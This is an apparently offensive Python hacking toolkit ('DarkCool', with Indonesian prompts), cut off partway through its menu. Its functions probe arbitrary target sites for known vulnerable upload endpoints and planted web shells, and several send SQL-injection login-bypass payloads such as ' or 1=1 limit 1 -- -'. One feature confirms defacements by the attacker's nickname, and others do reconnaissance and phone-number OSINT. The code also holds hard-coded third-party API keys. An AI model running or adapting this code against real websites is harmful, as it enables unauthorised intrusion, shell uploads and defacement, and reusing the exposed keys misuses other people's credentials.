import subprocess
import socket
import os
import requests
from bs4 import BeautifulSoup
import re
from termcolor import colored  # Import modul colored

os.system('git pull')

def clear_screen():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')

def normalize_url(url):
    if not re.match(r'^https?://', url):
        return 'http://' + url
    return url

def perl_alfa_finder(url):
    normalized_url = normalize_url(url)

    # Mengecek dengan exploit pertama
    exploit_url1 = normalized_url + "/alfacgiapi/perl.alfa"
    exploit_url2 = normalized_url + "/ALFA_DATA/alfacgiapi/perl.alfa"
    
    try:
        response1 = requests.get(exploit_url1)
        response2 = requests.get(exploit_url2)

        if response1.status_code == 200 or response2.status_code == 200:
            print(colored(f"\nTarget: {normalized_url}\nExploit 1: Vulnerability!", 'green'))
        else:
            print(colored(f"\nTarget: {normalized_url}\nExploit 1: Not Vuln", 'red'))

            if response2.status_code == 200:
                print(colored(f"Exploit 2: Vulnerability!", 'green'))
            else:
                print(colored(f"Exploit 2: Not Vuln", 'red'))

    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def print_colored_ascii_art():
    ascii_art = """
# ============================================================== #
# ==DDDDDDD===================DD=======DDDDD=================DD= #
# ==DD====DD==================DD======DD===DD================DD= #
# ==DD====DD==================DD=====DD======================DD= #
# ==DD====DD===DDD===DD=DDD===DD=DD==DD=========DDD====DDD===DD= #
# ==DD====DD==DD=DD==DDDD=DD==DDDD===DD========DDDDD==DDDDD==DD= #
# ==DD====DD=====DD==DD=======DDD====DD========DD=DD==DD=DD==DD= #
# ==DD====DD===DDDD==DD=======DDDD===DD========DD=DD==DD=DD==DD= #
# ==DD====DD==DD=DD==DD=======DD=DD===DD===DD==DD=DD==DD=DD==DD= #
# ==DDDDDDD====DDDD==DD=======DD=DD====DDDDD====DDD====DDD===DD= #
# ============================================================== #
$ =                                                       v7.5 = #
# = Coded by  : Dymles Ganz !                                  = #
# = Telegram  : @DymlesCoder                                   = #
# = Github    : DarkSkull777/DarkCool                          = #
# =                                                            = #
# ============================================================== #
    """
    colored_ascii_art = ascii_art.replace('=', colored('D', 'blue'))
    print(colored_ascii_art)

def check_website(url):
    normalized_url = normalize_url(url)
    
    try:
        if not re.match(r'^https?://\S+\.\S+', normalized_url):
            print(colored("URL yang di input enggak valid.", 'red'))
            return
        
        response = requests.get(normalized_url)
        
        if response.status_code == 200:
            print(colored("\nStatus Code: 200 - Website berjalan dengan baik", 'green'))
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string if soup.title else "Tidak ada judul"
            print(colored(f"Judul Website: {title}\n", 'green'))
        elif response.status_code == 404:
            print(colored("\nStatus Code: 404 - Halaman tidak ditemukan", 'red'))
        else:
            print(colored(f"Status Code: {response.status_code} - Terdapat masalah pada website", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def joomla_finder(target_url):
    exploit_url = target_url + "/api/index.php/v1/config/application?public=true"
    
    try:
        response = requests.get(exploit_url)
        
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulnerability!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} – Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def defaced_website_scanner(url, nickname):
    normalized_url = normalize_url(url)
    
    try:
        if not re.match(r'^https?://\S+\.\S+', normalized_url):
            print(colored("URL tidak valid", 'red'))
            return
        
        response = requests.get(normalized_url)
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string if soup.title else "Tidak ada judul"
            
            if nickname.lower() in title.lower() or nickname.lower() in response.text.lower() or nickname.lower() in normalized_url.lower():
                print(colored(f"\n{normalized_url} - Hacked!", 'green'))
            else:
                print(colored(f"\n{normalized_url} - Not Hacked", 'red'))
        elif response.status_code == 404:
            print(colored(f"{normalized_url} - Status Code: 404 - Halaman tidak ditemukan", 'red'))
        else:
            print(colored(f"{normalized_url} - Status Code: {response.status_code} - Terdapat masalah pada website", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def wordpress_chameleon_csrf_scanner(url):
    exploit_url = url + "/wp-content/themes/cameleon/includes/fileuploader/upload_handler.php"
    
    try:
        response = requests.get(exploit_url)
        
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulnerability!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def tinymce_auto_exploiter(url):
    exploit_url = url + "/tiny_mce/plugins/filemanager/InsertFile/insert_file.php"
    
    try:
        response = requests.get(exploit_url)
        
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulnerability!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def wordpress_ghost_auto_exploiter(url):
    exploit_url = url + "/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php"
    
    try:
        response = requests.get(exploit_url)
        
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulnerability!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def updone_check_shell_upload(url):
    exploit_url = url + "/sites/default/files/up.php"
    
    try:
        response = requests.get(exploit_url)
        
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulnerability!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def ganteng_dua_tujuh(url):
    # Menambahkan tanda ' di belakang URL
    url_with_apostrophe = url + "'"

    # Mengirim permintaan GET ke URL asli
    response_original = requests.get(url)

    # Mengirim permintaan GET ke URL dengan '
    response_modified = requests.get(url_with_apostrophe)

    # Memeriksa jika tampilan website berbeda setelah menambahkan '
    if response_original.text != response_modified.text:
        print(colored(f"\nTarget: {url} - Vulnarability SQLi!", 'green'))
    else:
        print(colored(f"\nTarget: {url} - Not Vuln :(", 'red'))

def pro_taxi(url):
    exploit_url = url + "/user/signup"
    
    try:
        response = requests.get(exploit_url)
        
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulnerability! Gas Tamper Data", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def halo_dunia_ku(url):
    # Teks yang ingin Anda masukkan di kolom atas dan kolom bawah
    kolom_atas = '="or\''
    kolom_bawah = '="or\''

    # Membuat data untuk POST request
    data = {
        'kolom_atas': kolom_atas,
        'kolom_bawah': kolom_bawah
    }

    # Mengirim POST request ke URL
    response = requests.post(url, data=data)

    # Memeriksa apakah respons mengandung teks "Login berhasil"
    if 'Login berhasil' in response.text:
        print(colored(f"\nTarget: {url} - Vulnerability!", 'green'))
    else:
        print(colored(f"\nTarget: {url} - Not Vuln :(", 'red'))

def yang_tahu_tempe(url):
    # Teks yang ingin Anda masukkan di kolom atas dan kolom bawah
    kolom_atasss = "admin"
    kolom_bawahhh = "pass"

    # Membuat data untuk POST request
    data = {
        'kolom_atasss': kolom_atasss,
        'kolom_bawahhh': kolom_bawahhh
    }

    # Mengirim POST request ke URL
    response = requests.post(url, data=data)

    # Memeriksa apakah respons mengandung teks "Login berhasil"
    if 'Login berhasil' in response.text:
        print(colored(f"\nTarget: {url} - Vulneribility!", 'green'))
    else:
        print(colored(f"\nTarget: {url} - Not Vuln :(", 'red'))

def jawir_ireng(url):
    # Teks yang ingin Anda masukkan di kolom atas dan kolom bawah
    kolom_atass = "' or 1=1 limit 1 -- -+'"
    kolom_bawahh = "' or 1=1 limit 1 -- -+'"

    # Membuat data untuk POST request
    data = {
        'kolom_atass': kolom_atass,
        'kolom_bawahh': kolom_bawahh
    }

    # Mengirim POST request ke URL
    response = requests.post(url, data=data)

    # Memeriksa apakah respons mengandung teks "Login berhasil"
    if 'Login berhasil' in response.text:
        print(colored(f"\nTarget: {url} - Vulneribility!", 'green'))
    else:
        print(colored(f"\nTarget: {url} - Not Vuln :(", 'red'))

def tested():
    print(colored("\nProgram SQL Lokomedia sedang Maintenance!", 'red'))
    input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))

def bapak_jamal(url):
    # Menambahkan Exploit ke URL
    exploit_url = url + "/dashboard/media.php"
    
    try:
        response = requests.get(exploit_url)
        
        # Mengecek status code
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulneribility!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def kawaii_file_hosting_list():
    urls = [
        "https://f.sed.lol/",
        "https://sicp.me/upload.php",
        "https://upload.implying.fun/",
        "https://uguu.se/",
        "https://host.junko.cafe/",
        "https://uguu.se/",
        "https://midi.moe/",
        "https://tmp.ninja.cutestat.com/",
        "https://patchouli.moe/",
        "https://www.moepantsu.com/"
    ]

    print(colored("\nList Website Vulneribility Kawaii File Hosting:", 'green'))
    for url in urls:
        print(url)

    input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))

def joomla_djclassifieds_auto_exploiter(url):
    # Menambahkan Exploit ke URL
    exploit_url = url + "/index.php?option=com_djclassifieds&task=upload&tmpl=component"
    
    try:
        response = requests.get(exploit_url)
        
        # Mengecek status code
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulneribility!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def wordpress_purevision_auto_exploit(url):
    # Menambahkan Exploit ke URL
    exploit_url = url + "/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php"
    
    try:
        response = requests.get(exploit_url)
        
        # Mengecek status code
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulneribility!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :(", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def telerik_bot_auto_exploiter(url):
    # Menambahkan Exploit ke URL
    exploit_url = url + "/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx"
    
    try:
        response = requests.get(exploit_url)
        
        # Mengecek status code
        if response.status_code == 200:
            print(colored(f"\nTarget: {exploit_url} - Vulneribility!", 'green'))
        elif response.status_code == 404:
            print(colored(f"\nTarget: {exploit_url} - Not Vuln :( ", 'red'))
        else:
            print(colored(f"\nTarget: {exploit_url} - Status Code: {response.status_code}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def website_indexing_checker(url):
    google_search_url = f"https://www.google.com/search?q=site:{url}"

    try:
        response = requests.get(google_search_url)

        if url in response.text:
            print(colored(f"\n{url} - Terindex!", 'green'))
        else:
            print(colored(f"\n{url} - Nggak Terindex", 'red'))

    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def negara_website_checker(url):
    # Membuat URL untuk permintaan GeoIP
    geoip_url = f"http://ip-api.com/json/{url}"

    try:
        response = requests.get(geoip_url)

        # Memeriksa jika permintaan berhasil
        if response.status_code == 200:
            data = response.json()
            if data["status"] == "success":
                negara = data["country"]
                print(colored(f"\nNegara {url}: {negara}", 'green'))
            else:
                print(colored(f"\nGagal Scanning Negara dari {url} :(", 'red'))
        else:
            print(colored(f"\nGagal Scanning Negara dari {url}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def get_ip_address_site(url):
    try:
        ip_address = socket.gethostbyname(url)
        print(colored(f"\nAlamat IP {url}: {ip_address}", 'green'))
    except socket.gaierror:
        print(colored("Tidak dapat menemukan alamat IP / URL tidak valid atau tidak dapat diakses.", 'red'))

def port_scanner(url):
    # Mendefinisikan daftar port yang akan diperiksa
    ports_to_scan = [20, 21, 22, 23, 25, 53, 80, 443, 110, 1433, 3306]

    # Mencetak informasi tentang URL
    print(f"Site : {url}\n")

    # Fungsi untuk memeriksa keterkaitan port
    def check_port(ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result

    # Mengambil alamat IP dari URL
    try:
        ip_address = socket.gethostbyname(url)
    except socket.gaierror:
        print("Nggak menemukan alamat IP gak valid, atau nggak dapat diakses.")
    else:
        for port in ports_to_scan:
            result = check_port(ip_address, port)
            if result == 0:
                print(f"Port {port} ({socket.getservbyport(port)}) - GOOD")
            else:
                print(f"Port {port} ({socket.getservbyport(port)}) - Inaccessible")

def geoip_location_lookup(url):
    # Membuat URL untuk permintaan geolokasi
    ip_api_url = f"http://ip-api.com/json/{url}"

    try:
        response = requests.get(ip_api_url)

        if response.status_code == 200:
            data = response.json()
            if data["status"] == "success":
                ip_address = data["query"]
                country = data["country"]
                state = data.get("regionName", "")
                city = data.get("city", "")
                latitude = data["lat"]
                longitude = data["lon"]

                print(colored(f"\nIP Address: {ip_address}", 'green'))
                print(colored(f"Country: {country}", 'green'))
                if state:
                    print(colored(f"State: {state}", 'green'))
                if city:
                    print(colored(f"City: {city}", 'green'))
                print(colored(f"Latitude: {latitude}", 'green'))
                print(colored(f"Longitude: {longitude}", 'green'))
            else:
                print(colored("\nGagal", 'red'))
        else:
            print(colored("\nGagal", 'red'))

    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def whois_lookup(url):
    # Membuat URL untuk mengakses layanan WHOIS
    whois_api_url = f"https://www.whois.com/whois/{url}"

    try:
        response = requests.get(whois_api_url)

        if response.status_code == 200:
            whois_data = response.text
            print(colored("\nInformasi WHOIS:", 'green'))
            print(whois_data)
        else:
            print(colored("\nGagal mendapatkan informasi WHOIS.", 'red'))

    except requests.exceptions.RequestException as e:
        print(colored(f"Terjadi kesalahan: {e}", 'red'))

def subdomain_scanner(url):
    # Endpoint API subdomain
    api_url = "https://api.securitytrails.com/v1/domain/{}/subdomains".format(url)

    # Header untuk permintaan API (menggunakan kunci API yang Anda berikan)
    headers = {
        "APIKEY": "DBXjwEKhNuahJa64rLzO-w4tcnDrSXoi"
    }

    try:
        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            subdomains_data = response.json()

            # Cetak daftar subdomain
            if "subdomains" in subdomains_data:
                subdomains = subdomains_data["subdomains"]
                if subdomains:
                    print(colored(f"\nSubdomains dari {url} ({len(subdomains)} subdomain ditemukan):", 'green'))
                    for subdomain in subdomains:
                        print(subdomain)
                    save_to_file = input(colored("\nMau Di Simpan Ke Dalam file Subdomain.txt? (y/n): ", 'cyan'))
                    if save_to_file.lower() == 'y':
                        with open("Subdomain.txt", "w") as file:
                            for subdomain in subdomains:
                                file.write(subdomain + "\n")
                        print(colored("\nList Subdomain telah disimpan kedalam file Subdomain.txt ! ^_^", 'green'))
                else:
                    print(colored(f"\nTidak ada subdomain yang ditemukan untuk {url}.", 'red'))
            else:
                print(colored("\nData subdomain enggak ditemukan :(", 'red'))
        else:
            print(colored("\nGagal mendapatkan informasi subdomain :(", 'red'))

    except requests.exceptions.RequestException as e:
        print(colored(f"\nTerjadi kesalahan: {e}", 'red'))

def check_dns_history(url):
    # Endpoint API DNS History
    api_url = f"https://api.securitytrails.com/v1/history/{url}/dns/a"

    # Header untuk permintaan API (menggunakan kunci API yang Anda berikan)
    headers = {
        "APIKEY": "DBXjwEKhNuahJa64rLzO-w4tcnDrSXoi",
        "Accept": "application/json"
    }

    try:
        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            dns_history_data = response.json()

            # Cetak hasil DNS History
            print("\nHasil DNS History:")
            for record in dns_history_data.get("records", []):
                print("\nFirst Seen:", record.get("first_seen", "N/A"))
                print("Organizations:", record.get("organizations", ["N/A"]))
                print("Last Seen:", record.get("last_seen", "N/A"))

                values = record.get("values", [])
                if values:
                    print("Values:")
                    for value in values:
                        print(f"IP: {value['ip']}, IP Count: {value['ip_count']}")
        else:
            print(colored("\nGagal mendapatkan informasi DNS History :(", 'red'))

    except requests.exceptions.RequestException as e:
        print(colored(f"\nTerjadi kesalahan: {e}", 'red'))

def ping_test():
    try:
        url = input(colored("\nPing Test\n[?] Silakan Masukkan URL website: ", 'cyan'))
        
        # Jalankan perintah ping
        result = subprocess.run(["ping", url], capture_output=True, text=True, timeout=10)
        output = result.stdout
        
        # Tampilkan hasil ping
        print(colored("\nPing Test ~", 'yellow'))
        print(colored(url + "\n", 'yellow'))
        print(output)
        
    except subprocess.TimeoutExpired:
        print(colored("\nPing Test: Request timeout :(", 'red'))

def ssl_scan(url):
    try:
        # Menjalankan perintah sslscan
        result = subprocess.check_output(['sslscan', url], stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return "Error: " + e.output

# Fungsi "Hitam Banget" untuk memeriksa nomor telepon
def hitam_banget():
    api_key = "58e71efe7992866366012249b47430b6"
    phone_number = input(colored("\nOSINT Number Scanner\nMasukkan Nomor Telepon (+62):", 'cyan'))

    response = requests.get(f"http://apilayer.net/api/validate?access_key={api_key}&number={phone_number}")

    data = response.json()

    print("\nHasil Pencarian:")
    print(f"ID: {data['valid']}")
    print(f"Score: {data['line_type']}")
    print(f"Access: {data['carrier']}")
    print(f"Phones E164 format: {data['international_format']}")
    print(f"NumberType: {data['line_type']}")
    print(f"NationalFormat: {data['local_format']}")

    # Periksa apakah 'dialling_code' ada dalam data sebelum mencetaknya
    if 'dialling_code' in data:
        print(f"DialingCode: {data['dialling_code']}")

    print(f"Carrier: {data['carrier']}")
    print(f"Type: {data['line_type']}")
    print(f"Address: {data['location']}")
    print(f"CountryCode: {data['country_code']}")

    # Mendapatkan koordinat geografis dari respons jika tersedia
    if 'latitude' in data and 'longitude' in data:
        latitude = data['latitude']
        longitude = data['longitude']

        # Permintaan untuk mengambil alamat berdasarkan koordinat
        geocoding_url = f"https://nominatim.openstreetmap.org/reverse?lat={latitude}&lon={longitude}&format=json"
        geocoding_response = requests.get(geocoding_url)
        geocoding_data = geocoding_response.json()

        # Menampilkan alamat jika tersedia
        if 'display_name' in geocoding_data:
            address = geocoding_data['display_name']
            print(f"Alamat: {address}")

# Fungsi untuk membaca daftar exploit dari file "duniaku.txt"
def baca_exploit(filename):
    with open(filename, 'r') as file:
        return file.read().splitlines()

# Fungsi untuk menu "Jamal Bin Asep"
def menu_jamal_bin_asep():
    # Meminta pengguna untuk memasukkan URL website
    url_website = input("\nAdmin Login Finder\n[?] Masukkan URL website target: ")

# Menambahkan "http://" jika tidak ada dalam URL yang dimasukkan oleh pengguna
    if not url_website.startswith('http://') and not url_website.startswith('https://'):
        url_website = 'http://' + url_website

    # Membaca daftar exploit dari "duniaku.txt"
    exploits = baca_exploit("duniaku.txt")

    # Mengecek setiap exploit pada URL website
    for exploit in exploits:
        full_url = url_website + exploit
        response = requests.get(full_url)

        # Memeriksa status kode HTTP
        if response.status_code == 200:
            print(f"URL: {full_url} - Status Kode 200 OK")
        else:
            print(f"URL: {full_url} - Status Kode {response.status_code}")

        # Menampilkan isi halaman jika diperlukan
        # print(response.text)

    print("Pemindaian selesai.")

def main_menu():
    while True:
        clear_screen()
        print_colored_ascii_art()
        print(colored("- - - - Daftar Menu Yang Tersedia - - - -", 'green'))
        print(colored("1. Cek Status dan Judul Website", 'yellow'))
        print(colored("2. Mencari Database Joomla V4.2.7 - 4.0.0", 'yellow'))
        print(colored("3. Defaced Website Scanner", 'yellow'))
        print(colored("4. WordPress Theme Chameleon CSRF", 'yellow'))
        print(colored("5. TinyMCE Auto Exploiter", 'yellow'))
        print(colored("6. WordPress Theme Ghost Auto Exploiter", 'yellow'))
        print(colored("7. Updone Check Shell Upload", 'yellow'))
        print(colored("8. SQL Injection", 'yellow'))
        print(colored("9. Pro Taxi Regis ~ Tamper Data", 'yellow'))
        print(colored("10. Bypass Admin Login", 'yellow'))
        print(colored("11. WordPress Default User/Pass Auto Login", 'yellow'))  # Tambahkan menu nomor 11
        print(colored("12. Auto Bypass SQL Login", 'yellow'))
        print(colored("13. SQL Lokomedia (Tested)", 'yellow'))
        print(colored("14. Galery Upload Shell Checker", 'yellow'))
        print(colored("15. Kawaii File Hosting ~ List", 'yellow'))
        print(colored("16. Joomla Djclassifieds Auto Exploiter", 'yellow'))
        print(colored("17. WordPress Theme Purevision Auto Exploit ~ CSRF", 'yellow'))
        print(colored("18. Telerick Method Bot Auto Exploit", 'yellow'))
        print(colored("19. Website Indexing Checker", 'yellow'))
        print(colored("20. Negara Website Checker", 'yellow'))
        print(colored("21. Get IP Address", 'yellow'))
        print(colored("22. Perl Alfa Finder", 'yellow'))
        print(colored("23. Port Scanner ~ NMAP", 'yellow'))
        print(colored("24. GeoIP Location Lookup", 'yellow'))
        print(colored("25. Whois Lookup Find Owner, Netblock, ASN, Dan Regis Dates", 'yellow'))
        print(colored("26. Subdomain Scanner", 'yellow'))
        print(colored("27. Check DNS History", 'yellow'))
        print(colored("28. Ping Network Test", 'yellow'))
        print(colored("29. SSL / TLS Scan", 'yellow'))
        print(colored("30. OSINT ~ Number Scanner", 'yellow'))
        print(colored("31. Admin Login Finder", 'yellow'))
        print(colored("666. Keluar", 'red'))
        menu_choice = input("\ndarkcool:~# ")
        if menu_choice == "1":
            input_url = input(colored("\nSelamat datang di menu Cek Status & Judul Web! ^_^\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            check_website(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "2":
            target_url = input(colored("\nSelamat datang ~ Database Joomla Finder ^_^\n[?] Masukkan Website Target (Joomla): ", 'cyan'))
            target_url = normalize_url(target_url)
            joomla_finder(target_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "3":
            scan_url = input(colored("\nSelamat datang ~ Defaced Website Scanner ^_^\n[?] Berikan website yang ingin di Scan: ", 'cyan'))
            scan_url = normalize_url(scan_url)
            nickname = input(colored("[?] Masukkan Nickname: ", 'cyan'))
            defaced_website_scanner(scan_url, nickname)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "4":
            input_url = input(colored("\nWordPress Theme Chameleon Scanner\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            wordpress_chameleon_csrf_scanner(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "5":
            input_url = input(colored("\nTinyMCE Auto Exploiter Scanner\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            tinymce_auto_exploiter(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "6":
            input_url = input(colored("\nWordPress Theme Ghost Auto Exploiter Scanner\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            wordpress_ghost_auto_exploiter(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "7":
            input_url = input(colored("\nUpdone Check Shell Upload Scanner\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            updone_check_shell_upload(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "8":
            input_url = input(colored("\nSQL Injection Menu ^_^\n[?] Silakan Masukkan URL Website (dengan angka id): ", 'cyan'))
            input_url = normalize_url(input_url)
            ganteng_dua_tujuh(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "9":
            input_url = input(colored("\nPro Taxi Tamper Data\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            pro_taxi(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "10":
            input_url = input(colored("\nBypass Admin Login\n[?] Silakan Masukkan URL Website (Login Panel): ", 'cyan'))
            input_url = normalize_url(input_url)
            halo_dunia_ku(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "11":
            input_url = input(colored("\nWP Default User/Pass Checker\n[?] Silakan Masukkan URL website (wp-login.php): ", 'cyan'))
            input_url = normalize_url(input_url)
            yang_tahu_tempe(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "12":
            input_url = input(colored("\nBypass SQL Login\n[?] Silakan Masukkan URL website(Panel Login): ", 'cyan'))
            input_url = normalize_url(input_url)
            jawir_ireng(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "13":
            input_url = input(colored("\nSQL Lokomedia\n[?] Silakan Masukkan URL website(ext: html): ", 'cyan'))
            tested()
        elif menu_choice == "14":
            input_url = input(colored("\nGalery Upload Shell Checker\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            bapak_jamal(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "15":
            kawaii_file_hosting_list()
        elif menu_choice == "16":
            input_url = input(colored("\nJoomla Djclassifieds Auto Exploiter\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            joomla_djclassifieds_auto_exploiter(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "17":
            input_url = input(colored("\nWordPress Purevision Auto Exploit\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            wordpress_purevision_auto_exploit(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "18":
            input_url = input(colored("\nTelerik Bot Auto Exploiter\n[?] Silakan Masukkan URL website: ", 'cyan'))
            input_url = normalize_url(input_url)
            telerik_bot_auto_exploiter(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "19":
            input_url = input(colored("\nWebsite Indexing Checker\n[?] Silakan Masukkan URL website: ", 'cyan'))
            website_indexing_checker(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "20":
            input_url = input(colored("\nWebsite Negara Checker\n[?]Silakan masukkan URL Website: ", 'cyan'))
            negara_website_checker(input_url)
            input(colored("\nTekan Enter untui kembali ke Menu...", 'yellow'))
        elif menu_choice == "21":
            input_url = input(colored("\nGet IP Address Site\n[?] Silakan Masukkan URL website: ", 'cyan'))
            get_ip_address_site(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "22":
            input_url = input(colored("\nPerl Alfa Finder\n[?] Silakan Masukkan URL website: ", 'cyan'))
            perl_alfa_finder(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "23":
            input_url = input(colored("\nPort Scanner\n[?] Silakan Masukkan URL website: ", 'cyan'))
            port_scanner(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "24":
            input_url = input(colored("\nGeoIP Location Lookup\n[?] Silakan Masukkan URL website: ", 'cyan'))
            geoip_location_lookup(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "25":
            input_url = input(colored("\nWhois Lookup Find Owner, Netblock, ASN, Dan Regis Dates\n[?] Silakan Masukkan URL website: ", 'cyan'))
            whois_lookup(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "26":
            input_url = input(colored("\nSubdomain Scanner\n[?] Silakan Masukkan URL website: ", 'cyan'))
            subdomain_scanner(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "27":
            input_url = input(colored("\nCheck DNS History\n[?] Silakan Masukkan URL website: ", 'cyan'))
            check_dns_history(input_url)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "28":
            ping_test()
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "29":
            url = input(colored("\nSSL / TLS Scanner\n[?] Silakan Masukkan URL website: ", 'cyan'))
